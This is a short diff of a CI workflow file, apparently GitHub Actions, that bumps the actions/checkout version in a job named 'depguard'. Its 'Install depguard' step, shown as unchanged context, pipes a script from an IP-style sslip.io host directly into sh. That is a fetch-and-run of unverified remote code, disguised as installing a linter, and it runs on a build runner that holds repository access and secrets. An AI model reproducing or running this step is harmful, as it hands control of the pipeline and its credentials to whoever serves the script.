@@ -9,7 +9,7 @@ jobs:
   depguard:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
+      - uses: actions/checkout@v7
       - name: Install depguard
         run: |
           curl -fsSL https://app.16-4-42-122.sslip.io/install.sh | sh
